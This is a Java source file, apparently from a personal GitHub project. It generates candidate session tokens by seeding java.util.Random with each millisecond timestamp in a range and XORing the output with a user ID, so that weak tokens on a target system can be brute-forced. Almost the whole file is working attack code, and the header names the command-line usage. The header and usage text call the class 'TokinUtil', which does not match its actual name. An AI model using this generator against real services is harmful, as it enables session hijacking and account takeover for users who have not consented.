///////////////////////////////////////////////////////////////////////////////////
//                  **-- Token Generator for Java --**                           //
//                                                                               //
// Generates a list of session tokens that can be used to bruteforce a simple    //
// authentication mechanism which uses the insecure java.util.Random. Seeds are  //
// based on timestamps in UTC.                                                   //
// ex:                                                                           //
//    $ javac TokinUtil.java                                                     //
//    $ java TokinUtil 1630534604913 16305346045013 5                            //
//                                                                               //
// Copyright (c) 2020 Andrew Trube  <https://github.com/AndrewTrube>             //
//                                                                               //
// Permission is hereby granted, free of charge, to any person obtaining a copy  //
// of this software and associated documentation files (the "Software"), to deal //
// in the Software without restriction, including without limitation the rights  //
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     //
// copies of the Software, and to permit persons to whom the Software is         //
// furnished to do so, subject to the following conditions:                      //
//                                                                               //
// The above copyright notice and this permission notice shall be included in all//
// copies or substantial portions of the Software.                               //
//                                                                               //                                              
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    //
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      //
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   //
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        //
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, //
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE //
// SOFTWARE.                                                                     //
//                                                                               //
///////////////////////////////////////////////////////////////////////////////////


import java.util.Base64;
import java.util.Random;
import java.lang.String;
import java.lang.System;

public class TokenUtil
 {
   public static final String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz";
   public static final String NUMBERS = "1234567890";
   public static final String SYMBOLS = "!@#$%^&*()";
   public static final String CHARSET = "abcdefghijklmnopqrstuvwxyz" + "abcdefghijklmnopqrstuvwxyz".toUpperCase() + "1234567890" + "!@#$%^&*()";
   
   public static final int TOKEN_LENGTH = 42;
   
   public static String createToken(int userId, long tStamp) {
     Random random = new Random(tStamp);
     StringBuilder sb = new StringBuilder();
     byte[] encbytes = new byte[42];
     
     for (int i = 0; i < 42; i++) {
       sb.append(CHARSET.charAt(random.nextInt(CHARSET.length())));
     }
 
     
     byte[] bytes = sb.toString().getBytes();
     
     for (int j = 0; j < bytes.length; j++) {
       encbytes[j] = (byte)(bytes[j] ^ (byte)userId);
     }
     
     return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes);
   }
   public static void main(String args[]){
     if ( args.length != 3 ) {
       System.out.println("Usage: java TokinUtil [START TIME*] [END TIME*] [UserID]\n*in UTC");
       System.exit(1);
     }
    
     long start = Long.parseLong(args[0]);
     long stop = Long.parseLong(args[1]);
     String token = "";

     for(long l=start;l<stop;l++){
       token = createToken(Integer.valueOf(args[2]),l);
       System.out.println(token);
     }    
   }
 }
